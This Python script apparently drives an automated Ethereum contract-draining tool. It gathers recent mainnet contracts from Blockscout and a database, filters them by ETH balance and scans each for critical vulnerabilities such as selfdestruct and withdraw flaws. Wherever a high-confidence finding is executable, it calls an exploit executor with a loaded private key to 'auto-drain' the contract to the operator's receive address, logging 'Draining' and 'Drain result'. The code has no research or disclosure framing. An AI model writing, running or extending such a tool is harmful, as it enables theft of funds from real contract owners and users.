#!/usr/bin/env python3
"""Deep Ethereum scan via EvmScanner — finds selfdestruct + TOS + withdraw with onlyOwner check."""
import logging, time, tomllib, os, sqlite3
from decimal import Decimal
from src.rpc import RpcClient
from src.sources.blockscout import BlockscoutRecentSource
from src.types import TokenInfo, PoolInfo, Chain, ContractTarget
from src.scanners.evm_scanner import EvmScanner
from src.data import DataCollector
from src.explorer import ExplorerClient
from src.verifiers.runner import VerifierRunner
from src.verifiers.honeypot import HoneypotVerifier
from src.verifiers.exploit_simulator import SimulatedExploitVerifier
from src.verifiers.multi_step import MultiStepVerifier
from src.exploit_executor import ExploitExecutor
from src.signer import load_evm_private_key, get_receive_address
from src.reporter.json_report import JsonReporter

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(name)s] %(levelname)s: %(message)s")
logger = logging.getLogger("eth-deep")

CHAIN = Chain.ETHEREUM

def load_config():
    with open("config.toml", "rb") as f:
        return tomllib.load(f)

def get_bal(rpc, addr):
    try:
        raw = rpc.call("eth_getBalance", [addr, "latest"])
        bal_str = raw.get("result", "0x0") if isinstance(raw, dict) else str(raw)
        return int(str(bal_str), 16) / 1e18
    except:
        return 0.0

def main():
    config = load_config()
    rpc = RpcClient(config["rpc"]["ethereum"])
    signer = load_evm_private_key()
    receive = get_receive_address(CHAIN) or signer.address
    executor = ExploitExecutor(signer) if signer else None

    initial_bal = get_bal(rpc, signer.address)
    logger.info("Signer: %s | Receive: %s | Balance: %.6f ETH", signer.address, receive, initial_bal)

    # Build scanner
    explorer = ExplorerClient()
    data = DataCollector(rpc=rpc, explorer=explorer)
    verifier_runner = VerifierRunner(verifiers=[
        HoneypotVerifier(), SimulatedExploitVerifier(), MultiStepVerifier(),
    ])
    scanner = EvmScanner(data_collector=data, rpc=rpc, verifier_runner=verifier_runner, executor=executor)
    reporter = JsonReporter(output_dir=config["analyzer"]["reports_dir"])

    # Fetch contracts
    logger.info("Fetching Ethereum contracts from Blockscout (50 pages)...")
    source = BlockscoutRecentSource(max_pages=50)
    contracts = source.fetch(CHAIN)
    logger.info("Got %d contracts from Blockscout", len(contracts))

    # Also load from DB
    db_path = config["analyzer"]["db_path"]
    try:
        db = sqlite3.connect(db_path)
        db_addrs = {r[0].lower() for r in db.execute("SELECT address FROM contract_targets WHERE chain='ethereum'").fetchall()}
        known = {c.address.lower() for c in contracts}
        missing = db_addrs - known
        for addr in missing:
            contracts.append(ContractTarget(chain=CHAIN, address=addr, source="db"))
        logger.info("Added %d from DB, total: %d", len(missing), len(contracts))
        db.close()
    except Exception as e:
        logger.warning("DB load: %s", e)

    # Check balances first
    candidates = []
    for i, ct in enumerate(contracts):
        bal = get_bal(rpc, ct.address)
        if bal >= 0.0003:
            candidates.append((ct, bal))
        if (i+1) % 500 == 0:
            logger.info("Balance check: %d/%d, %d with >=0.0003 ETH", i+1, len(contracts), len(candidates))

    logger.info("Candidates with balance >= 0.0003 ETH: %d", len(candidates))
    candidates.sort(key=lambda x: x[1], reverse=True)

    # Scan each with EvmScanner
    for ct, bal in candidates:
        token = TokenInfo(address=ct.address, symbol=ct.address[:10], chain=CHAIN)
        pool = PoolInfo(address="", dex="direct", liquidity_usd=Decimal("0"))

        try:
            report = scanner.scan(token, pool)
            critical = [f for f in report.findings if f.severity.name == "CRITICAL"]
            if critical:
                logger.info(">> %s | %.4f ETH | %s", ct.address[:10], bal, " | ".join(f"{f.check_name} conf={f.confidence}" for f in critical))
                # Auto-drain via executor
                for finding in critical:
                    if executor and finding.confidence is not None and finding.confidence >= 0.9:
                        can_execute = executor.can_execute(finding)
                        if can_execute:
                            logger.info("  Draining %s via %s...", ct.address[:10], finding.check_name)
                            result = executor.execute(finding, token, chain=CHAIN, receive_address=receive)
                            logger.info("  Drain result: %s", result)
            else:
                logger.info(".  %s | %.4f ETH | no CRITICAL findings", ct.address[:10], bal)
        except Exception as e:
            logger.error("Scan failed %s: %s", ct.address[:10], e)

        # Small delay to avoid rate limits
        time.sleep(0.3)

    final_bal = get_bal(rpc, signer.address)
    logger.info("="*60)
    logger.info("DONE — Signer: %.6f → %.6f ETH (spent: %.6f)", initial_bal, final_bal, initial_bal - final_bal)

if __name__ == "__main__":
    main()
